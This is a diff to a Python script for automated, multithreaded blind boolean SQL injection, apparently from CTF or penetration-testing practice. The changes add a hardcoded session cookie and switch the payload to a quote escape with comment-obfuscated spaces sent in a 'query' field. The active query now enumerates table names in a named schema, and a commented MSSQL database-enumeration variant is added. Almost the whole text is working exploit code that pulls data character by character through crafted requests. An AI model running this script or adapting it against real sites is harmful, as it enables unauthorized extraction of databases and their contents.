@@ -3,13 +3,16 @@
 import threading
 import requests
 import random
+from urllib.parse import urlencode
 
 
 headers={
     "User-Agent": "Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0",
     "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
     "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
-    "Accept-Encoding": "gzip, deflate"
+    "Accept-Encoding": "gzip, deflate",
+    "Cookie": "JSESSIONID=3C57905446A0F271DAB2183A28E7081C",
+    "Content-Type": "application/x-www-form-urlencoded"
 }
 
 proxies = {"http":"127.0.0.1:8080","https":None}
@@ -40,15 +43,17 @@ def payload(i,j):
     global check
 
     # sql = "(ord(substr((select(group_concat(schema_name))from(information_schema.schemata)),%d,1))>%d)"%(i,j)                                #数据库名字          
-    # sql = "(ord(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)='ctfshow'),%d,1))>%d)#"%(i,j)           #表名
+    sql = "(ord(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)like'qinghai'),%d,1))>%d)#"%(i,j)           #表名
     # sql = "(ord(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name='1919810931114514')),%d,1))>%d)#"%(i,j)        #列名
     # sql = "(ord(substr((select(group_concat(flag))from(1919810931114514)),%d,1))>%d)#"%(i,j)
-    sql="(ord(mid(database(),%d,1))>%d)"%(i,j)
+    # sql="(ord(mid(database(),%d,1))>%d)"%(i,j)
+
+    # mssql
+    # sql="(ascii(substring((select top 1 name from master.dbo.sysdatabases where name not in ('master','tempdb','model','msdb','ReportServrver%24\MYSQLQLSERVER')),%d,1)) > %d)"%(i,j)
     #print(i)
     # header = {'User-Agent': user_agent[random.randint(0,7)]}
-
-    data ="1 and "+sql
-    r = requests.post(url,headers=headers,data={'id':data},files={'id'},proxies=proxies)
+    sql_data ="query="+"3'%2F**%2For%2F**%2F"+sql
+    r = requests.post(url,headers=headers,data=sql_data,proxies=proxies)
     # print (r.text)
     if check in r.text:
         res = 1
@@ -83,7 +88,7 @@ def main():
     a=1
     f=True
 
-    thread_num=10
+    thread_num=8
 
     while f:
         threads = []
@@ -107,6 +112,6 @@ def main():
 
 if __name__ == '__main__':
     flag = ""
-    url="http://192.168.37.198:1002/index.php"#目标url
-    check="fakeflag"
+    url=""#目标url
+    check="129"
     main()
